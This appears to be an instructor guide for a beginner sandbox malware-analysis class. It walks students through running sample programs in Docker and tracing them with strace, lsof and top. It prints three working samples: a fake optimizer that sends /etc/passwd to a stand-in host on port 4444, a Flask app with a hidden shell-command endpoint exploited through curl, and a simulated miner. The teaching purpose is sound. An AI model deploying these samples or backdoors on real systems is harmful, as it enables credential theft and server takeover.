# Sandbox Security Analysis - Instructor Guide

## 📚 Overview

This instructor guide provides complete teaching notes, setup instructions,
answer keys, and assessment materials for the Sandbox Security Analysis
exercise. The exercise teaches students how to safely analyze potentially
malicious applications in controlled environments.

**Class Duration**: 3-4 hours  
**Student Level**: Beginner to Intermediate (basic computer skills required - no
programming background needed)  
**Group Size**: 15-25 students (individual or pairs)

### 🔰 For Non-Technical Instructors

**Don't worry if you're not an IT expert!** This guide includes:

- Step-by-step terminal commands (just copy and paste)
- Clear explanations of what each command does
- Troubleshooting help for common issues
- All commands are provided from the main project folder

## 🎯 Learning Outcomes

### Primary Objectives

Students will demonstrate ability to:

1. **Explain sandbox analysis concepts** and differentiate from SAST/DAST
2. **Set up secure analysis environments** using containers and monitoring tools
3. **Execute behavioral analysis** using system call tracing and resource
   monitoring
4. **Identify malicious behavior patterns** in applications and scripts
5. **Document security findings** with evidence and risk assessment

### Assessment Rubric

| Criteria                  | Excellent (4)                                       | Proficient (3)                             | Developing (2)              | Beginning (1)                    |
| ------------------------- | --------------------------------------------------- | ------------------------------------------ | --------------------------- | -------------------------------- |
| **Concept Understanding** | Clearly explains sandbox analysis vs other methods  | Understands basic concepts with minor gaps | Shows partial understanding | Limited understanding            |
| **Technical Execution**   | Flawlessly sets up monitoring and executes analysis | Sets up tools correctly with minimal help  | Requires some guidance      | Needs significant assistance     |
| **Threat Identification** | Identifies all malicious behaviors with evidence    | Identifies most threats accurately         | Identifies some threats     | Misses major threats             |
| **Documentation**         | Professional report with clear evidence             | Good documentation with minor gaps         | Basic documentation         | Poor or incomplete documentation |

## 🛠️ Pre-Class Setup (30 minutes)

### 📍 Important: Starting Location

**Always start commands from the main project folder.** If you get lost in the
terminal:

```bash
# Return to the main project folder (copy and paste this command)
cd /workspaces/Docker_Sandbox_Demo

# Check you're in the right place (you should see folders like 'docker', 'src', 'samples')
ls
```

### Environment Verification

**📋 What this does**: Checks that Docker is working and starts our secure
testing environment

```bash
# Step 1: Make sure you're in the main folder
cd /workspaces/Docker_Sandbox_Demo

# Step 2: Check Docker is working (should show version numbers)
docker --version
docker-compose --version

# Step 3: Start the sandbox environment (this takes 1-2 minutes)
cd docker
docker-compose up -d

# Step 4: Return to main folder
cd ..

# Step 5: Test the sandbox is ready (should show "Sandbox ready")
docker exec -it cybersec_sandbox bash -c "echo 'Sandbox ready'"
```

### 🔍 What Students Will See

- Version numbers for Docker (means it's working)
- Download progress bars (Docker setting up the environment)
- "Sandbox ready" message (everything is working)

### Sample Files Preparation

**📋 What this does**: The sample malicious files are already included in the
project. You just need to verify they're there.

```bash
# Step 1: Make sure you're in the main folder
cd /workspaces/Docker_Sandbox_Demo

# Step 2: Check that sample files exist (should show file listings)
ls samples/suspicious-scripts/
ls samples/backdoor-apps/
ls samples/resource-abuse/
```

**✅ Expected Results**: You should see files like:

- `suspicious_script.py` in suspicious-scripts folder
- `backdoor_app.py` in backdoor-apps folder
- `crypto_miner.py` in resource-abuse folder

**❌ If files are missing**: Contact technical support or use the sample code
provided in this guide.

1. **Suspicious Script** (`suspicious-scripts/suspicious_script.py`):

```python
#!/usr/bin/env python3
import os
import socket
import time
import base64

# Appears to be a system optimizer
print("System Optimizer v1.0 - Improving performance...")

# Hidden malicious behavior
try:
    # Attempt to access sensitive files
    with open('/etc/passwd', 'r') as f:
        users = f.read()

    # Try to establish backdoor connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('suspicious-server.com', 4444))
    s.send(base64.b64encode(users.encode()))
    s.close()

    # Create hidden file
    with open('/tmp/.hidden_backdoor', 'w') as f:
        f.write("backdoor_installed")

except Exception as e:
    pass  # Hide errors

# Legitimate-looking behavior
for i in range(10):
    print(f"Optimizing system component {i+1}/10...")
    time.sleep(1)

print("Optimization complete!")
```

2. **Backdoor Web App** (`backdoor-apps/backdoor_app.py`):

```python
#!/usr/bin/env python3
from flask import Flask, request, render_template_string
import subprocess
import os

app = Flask(__name__)

# Normal web pages
@app.route('/')
def home():
    return "<h1>Welcome to SecureApp</h1><p>A trusted business application</p>"

@app.route('/about')
def about():
    return "<h1>About Us</h1><p>We provide secure business solutions</p>"

@app.route('/contact')
def contact():
    return "<h1>Contact</h1><p>Email: contact@secureapp.com</p>"

# Hidden backdoor endpoint
@app.route('/admin_debug_console')
def backdoor():
    cmd = request.args.get('cmd', 'whoami')
    try:
        result = subprocess.check_output(cmd, shell=True, text=True)
        return f"<pre>{result}</pre>"
    except Exception as e:
        return f"Error: {str(e)}"

# Another hidden endpoint
@app.route('/system_health')
def health():
    return """
    <h2>System Health Check</h2>
    <form action="/admin_debug_console" method="get">
        <input type="text" name="cmd" placeholder="System command">
        <input type="submit" value="Execute">
    </form>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

3. **Crypto Miner Simulation** (`resource-abuse/crypto_miner.py`):

```python
#!/usr/bin/env python3
import hashlib
import time
import random
import threading
import socket

print("Background System Maintenance Tool v2.1")
print("Performing routine system optimization...")

def cpu_intensive_task():
    """Simulate cryptocurrency mining"""
    while True:
        # Generate intensive CPU work
        data = str(random.randint(1, 1000000)).encode()
        for i in range(10000):
            hashlib.sha256(data + str(i).encode()).hexdigest()
        time.sleep(0.01)  # Brief pause

def network_activity():
    """Simulate mining pool connections"""
    servers = ['mining-pool1.com', 'crypto-server.net', 'mining.example.com']
    while True:
        try:
            server = random.choice(servers)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            # These will fail but show up in network monitoring
            s.connect((server, 8333))  # Bitcoin port
            s.close()
        except:
            pass
        time.sleep(30)

# Start multiple threads for high CPU usage
for i in range(4):  # Use 4 CPU cores
    thread = threading.Thread(target=cpu_intensive_task)
    thread.daemon = True
    thread.start()

# Start network activity thread
net_thread = threading.Thread(target=network_activity)
net_thread.daemon = True
net_thread.start()

# Keep main thread alive
try:
    while True:
        print("Maintenance in progress... Please wait.")
        time.sleep(60)
except KeyboardInterrupt:
    print("Maintenance completed.")
```

## 📋 Lesson Plan

### Introduction (30 minutes)

#### Opening Hook (5 minutes)

**🎯 Teaching Tip**: Start with a relatable scenario **Question**: "What would
you do if you found a USB drive in the parking lot?"

- Discuss why running unknown software is dangerous
- Share real news stories about USB attacks
- Introduce the concept of safe analysis environments

#### Sandbox Analysis Overview (15 minutes)

**🎯 Key Teaching Points (use simple analogies)**:

1. **Definition**: Like a protective bubble for testing dangerous software
   - _Analogy_: Like handling toxic chemicals in a sealed glove box
2. **Comparison**: Different ways to test software safety
   - _SAST_: Reading the recipe (examining code)
   - _DAST_: Tasting the food (testing the running program)
   - _Sandbox_: Watching the cook's behavior (monitoring what software actually
     does)
3. **Real-world usage**: How cybersecurity professionals use this daily

#### 💻 Simple Demo for Students

**📋 What this does**: Shows the difference between safe examination and
dangerous execution

```bash
# Step 1: Make sure you're in the main folder
cd /workspaces/Docker_Sandbox_Demo

# Step 2: Enter the safe testing environment
docker exec -it cybersec_sandbox bash

# Step 3: Look at suspicious code safely (just reading it)
cat samples/suspicious-scripts/suspicious_script.py

# Step 4: Exit the sandbox for now (we'll come back)
exit
```

**🎯 Teaching Point**: "We can READ code safely, but RUNNING it needs special
protection"

#### Tool Introduction (10 minutes)

**🎯 Teaching Tip**: Explain tools with simple analogies

**Essential Monitoring Tools** (like security cameras for software):

- **strace**: Records every action the software takes (like a security camera)
- **netstat**: Shows what network connections are made (like monitoring phone
  calls)
- **top**: Shows how much computer power is being used (like a speedometer)
- **lsof**: Shows what files are being accessed (like monitoring which doors are
  opened)

**💬 Student-Friendly Explanation**: "These tools are like having security
guards watching everything the software does - every file it touches, every
network connection it makes, and how much of the computer's power it uses."

### Hands-On Exercise 1: Basic Behavioral Analysis (45 minutes)

#### 📍 Setup Phase (10 minutes)

**🎯 Instructor Demonstration** (show students step-by-step):

```bash
# Step 1: Make sure you're in the main folder
cd /workspaces/Docker_Sandbox_Demo

# Step 2: Enter our safe testing environment
docker exec -it cybersec_sandbox bash

# Step 3: Start monitoring the suspicious script (this runs it while watching everything it does)
strace -o /tmp/trace.log -f python samples/suspicious-scripts/suspicious_script.py &

# Wait for the script to finish (about 15 seconds)
wait

# Step 4: The script is done - now let's see what it did
echo "Analysis complete - let's examine what happened"
```

**💬 Explain to Students**: "We just ran potentially dangerous software, but
it's safe because we're in our protected sandbox environment. The 'strace'
command recorded everything the software did."

**👥 Student Activity**: Students follow the same steps on their computers

#### 🔍 Analysis Phase (25 minutes)

**🎯 Guided Discovery** (help students find evidence step-by-step):

**1. 🕵️ Looking for Unauthorized File Access**:

```bash
# Search for attempts to read sensitive system files
grep "openat.*passwd" /tmp/trace.log
```

**💬 Explain**: "This shows if the software tried to read the password file"
**✅ Expected Finding**: Lines showing access to `/etc/passwd` (user account
information)

**2. 🌐 Looking for Suspicious Network Activity**:

```bash
# Search for network connection attempts
grep "connect" /tmp/trace.log
```

**💬 Explain**: "This shows if the software tried to contact other computers"
**✅ Expected Finding**: Connection attempts to `suspicious-server.com`

**3. 📁 Looking for Hidden Files**:

```bash
# Search for creation of hidden files
grep "openat.*hidden" /tmp/trace.log
```

**💬 Explain**: "This shows if the software created secret files" **✅ Expected
Finding**: Creation of `.hidden_backdoor` file

**🎯 Teaching Tip**: Walk around and help students interpret their results. Many
will see lots of technical output - help them focus on the key findings above.

#### 💭 Discussion Phase (10 minutes)

**🎯 Key Questions for Class Discussion**:

**Q**: "What behaviors did we observe that indicate this software is
malicious?"  
**A**: Help students identify:

- ✅ Reading sensitive system files (`/etc/passwd`)
- ✅ Trying to send data to external servers
- ✅ Creating hidden files for persistence
- ✅ Pretending to be legitimate software (fake "optimization")

**Q**: "How might real attackers use software like this?"  
**A**: Discuss real-world scenarios:

- Stealing user account information
- Creating backdoors for future access
- Sending sensitive data to criminals

**Q**: "Why is sandbox analysis important?"  
**A**: Emphasize that:

- We can safely study dangerous software
- We can gather evidence for investigations
- We can understand attack methods to better defend

**🎯 Teaching Tip**: Encourage students to share their observations. Some may
find additional suspicious behaviors in their logs.

### Hands-On Exercise 2: Web Application Backdoor Detection (45 minutes)

#### 🔍 Discovery Phase (20 minutes)

**📍 Setup First**:

```bash
# Step 1: Make sure you're in the main folder (if you exited the sandbox)
cd /workspaces/Docker_Sandbox_Demo

# Step 2: Enter sandbox environment
docker exec -it cybersec_sandbox bash

# Step 3: Start the suspicious web application
python samples/backdoor-apps/backdoor_app.py &

# Step 4: Wait a moment for it to start
sleep 3

# Step 5: Test that the web app is running
curl http://localhost:5000
```

**👥 Student Task**: Find hidden, dangerous web pages in the application

**🎯 Teaching Strategy - Provide Progressive Hints**:

1. **First hint**: "Try looking for pages that might be used by administrators"
2. **Second hint**: "Look for debug or console pages"
3. **Final hint**: "Try these specific pages: `/admin_debug_console` and
   `/system_health`"

**💻 Student Commands**:

```bash
# Test normal pages (should work fine)
curl http://localhost:5000/
curl http://localhost:5000/about
curl http://localhost:5000/contact

# Test for hidden admin pages
curl http://localhost:5000/admin_debug_console
curl http://localhost:5000/system_health
```

#### ⚠️ Analysis Phase (15 minutes)

**🎯 Demonstrate the Danger - Command Execution Testing**:

```bash
# Test 1: See what user the web server runs as
curl "http://localhost:5000/admin_debug_console?cmd=whoami"

# Test 2: List files in the current directory
curl "http://localhost:5000/admin_debug_console?cmd=ls%20-la"

# Test 3: Show system information (VERY DANGEROUS in real life)
curl "http://localhost:5000/admin_debug_console?cmd=cat%20/etc/passwd"
```

**💬 Explain to Students**: "These commands show that an attacker could run ANY
command on the server through this hidden web page. This is extremely
dangerous!"

**✅ Expected Findings**:

- The web app can execute system commands
- Attackers could access sensitive system files
- The backdoor is hidden from normal users
- This could give complete control of the server

**🎯 Teaching Tip**: Emphasize this is only safe because we're in our sandbox.
In real life, never test these commands on systems you don't own!

#### 📝 Documentation Phase (10 minutes)

**👥 Student Activity**: Have students write down their findings:

**📋 Questions for Students to Answer**:

1. **Where is the backdoor located?** (Answer: `/admin_debug_console` page)
2. **What can attackers do with it?** (Answer: Run any system command)
3. **How dangerous is this?** (Answer: Complete server takeover possible)
4. **How could this be fixed?** (Answer: Remove the backdoor code, add proper
   security)

**🎯 Teaching Tip**: Walk around and help students organize their thoughts. This
documentation practice prepares them for real cybersecurity work.

### Hands-On Exercise 3: Resource Abuse Detection (30 minutes)

#### 📍 Monitoring Setup (10 minutes)

**🎯 What This Does**: Shows how malware can secretly use computer resources for
criminal purposes

```bash
# Step 1: Make sure you're in the main folder and sandbox
cd /workspaces/Docker_Sandbox_Demo
docker exec -it cybersec_sandbox bash

# Step 2: Check normal computer usage (baseline)
top -b -n 1 > baseline.log
echo "Baseline CPU usage recorded"

# Step 3: Start the fake "maintenance tool" (actually cryptocurrency miner)
python samples/resource-abuse/crypto_miner.py &
MINER_PID=$!
echo "Maintenance tool started with ID: $MINER_PID"

# Step 4: Wait 30 seconds for the miner to ramp up
sleep 30
```

**💬 Explain to Students**: "This software claims to be a 'maintenance tool' but
is actually stealing computer power to mine cryptocurrency for criminals."

#### 📊 Resource Analysis (15 minutes)

**🎯 What to Look For**: Signs that software is stealing computer resources

**📈 Key Metrics Students Should Observe**:

- **CPU usage should spike to 90%+ (very high)**
- **Multiple processes/threads running**
- **Network connections to suspicious mining websites**

**💻 Analysis Commands for Students**:

```bash
# Check CPU usage (should be very high now)
top -p $MINER_PID

# See what network connections it's making
lsof -p $MINER_PID | grep ESTABLISHED

# Count how many threads it's using (should be multiple)
ps -T -p $MINER_PID
```

**💬 Student-Friendly Explanations**:

- **High CPU = Stealing computer power for criminal purposes**
- **Multiple threads = Using all available processor cores**
- **Network connections = Sending stolen work to criminal servers**

**🎯 Teaching Tip**: Students should see a dramatic difference between baseline
(low CPU) and current usage (very high CPU)

#### 🎯 Pattern Recognition (5 minutes)

**💭 Class Discussion - What Did We Learn?**

**✅ Evidence of Cryptocurrency Mining Malware**:

- **Sustained high CPU usage** (stealing computer power)
- **Multiple processor cores utilized** (maximizing theft)
- **Connections to mining-related websites** (sending stolen work to criminals)
- **Deceptive naming** (pretends to be "maintenance tool")

**💬 Real-World Impact Discussion**:

- **Electricity bills increase** (higher power consumption)
- **Computer performance drops** (legitimate work slows down)
- **Hardware wear increases** (components degrade faster)
- **Criminal profits** (attackers make money from your computer)

**🎯 Teaching Tip**: Help students understand this is a real problem affecting
millions of computers worldwide.

## 🎯 Common Student Challenges & Solutions

### 📍 Navigation Problems

**❌ Problem**: Students get lost in the terminal and can't find the right
folder **✅ Simple Solution**:

```bash
# Always return to the main project folder with this command
cd /workspaces/Docker_Sandbox_Demo

# Check you're in the right place (should see: docker, src, samples folders)
ls
```

**❌ Problem**: "Command not found" errors **✅ Simple Solution**: Make sure
students are inside the sandbox:

```bash
# Enter the sandbox environment first
docker exec -it cybersec_sandbox bash

# Then run the analysis commands
```

### 🐳 Docker Issues

**❌ Problem**: Students can't access Docker container  
**✅ Step-by-Step Fix**:

```bash
# Step 1: Check if containers are running
docker ps

# Step 2: If not running, restart them
cd /workspaces/Docker_Sandbox_Demo/docker
docker-compose restart cybersec_sandbox

# Step 3: Return to main folder
cd ..

# Step 4: Test access
docker exec -it cybersec_sandbox bash -c "echo 'Working now'"
```

### 📊 Analysis Output Problems

**❌ Problem**: Students get overwhelmed by too much technical output **✅
Teaching Strategy**: Focus on the specific grep commands provided

```bash
# Instead of looking at everything, search for specific evidence
grep "passwd" /tmp/trace.log
grep "connect" /tmp/trace.log
grep "hidden" /tmp/trace.log
```

**🎯 Teaching Tip**: Remind students they're looking for evidence, not
understanding every technical detail.

### 🧠 Conceptual Understanding Issues

**❌ Challenge**: Students confuse sandbox analysis with SAST/DAST **✅ Teaching
Strategy**: Use this simple comparison table

| Method      | What It Does               | When To Use                      |
| ----------- | -------------------------- | -------------------------------- |
| **SAST**    | Reads the code like a book | Before software is finished      |
| **DAST**    | Tests the running software | When software is working         |
| **Sandbox** | Watches software behavior  | When software might be dangerous |

**❌ Challenge**: Students miss important malicious behaviors **✅ Teaching
Strategy**:

- Provide the specific grep commands (don't expect students to discover them)
- Walk around and help interpret results
- Focus on the three main evidence types: file access, network activity, hidden
  files

**❌ Challenge**: Students don't understand why this matters **✅ Real-World
Examples to Share**:

- NotPetya malware caused $10 billion in damages worldwide
- Cryptomining malware steals electricity and computer performance
- Corporate data breaches start with malicious software analysis

## 🔧 Simple Troubleshooting Guide

### 🚨 Emergency Reset Instructions

**If everything stops working:**

```bash
# Step 1: Go to main folder
cd /workspaces/Docker_Sandbox_Demo

# Step 2: Stop everything
cd docker
docker-compose down

# Step 3: Start fresh
docker-compose up -d

# Step 4: Return to main folder
cd ..

# Step 5: Test it works
docker exec -it cybersec_sandbox bash -c "echo 'Reset complete'"
```

### ✅ Quick Verification Checklist

**Before starting class, verify:**

- [ ] Docker commands show version numbers
- [ ] `docker ps` shows running containers
- [ ] Sample files exist in samples/ folders
- [ ] Sandbox responds to test commands

**🎯 Pro Tip**: Do this verification 15 minutes before class starts!

## 📚 Extension Activities

### Advanced Challenges

1. **Multi-stage Malware**: Analyze malware that downloads additional payloads
2. **Evasion Techniques**: Study malware that detects analysis environments
3. **Network Protocol Analysis**: Deep packet inspection of malicious traffic
